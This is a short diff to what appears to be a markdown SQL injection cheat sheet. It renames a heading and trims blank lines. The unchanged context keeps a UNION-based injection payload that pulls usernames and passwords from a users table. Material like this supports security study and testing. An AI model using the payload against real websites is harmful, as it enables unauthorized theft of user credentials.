@@ -1,4 +1,4 @@
-# UNION attacks
+# Union
 
 Determine number of columns:
 
@@ -13,10 +13,3 @@ Retrieve contents of `users` table:
 ```sql
 '+UNION+SELECT+username,+password+FROM+users--
 ```
-
-
-
-
-
-
-
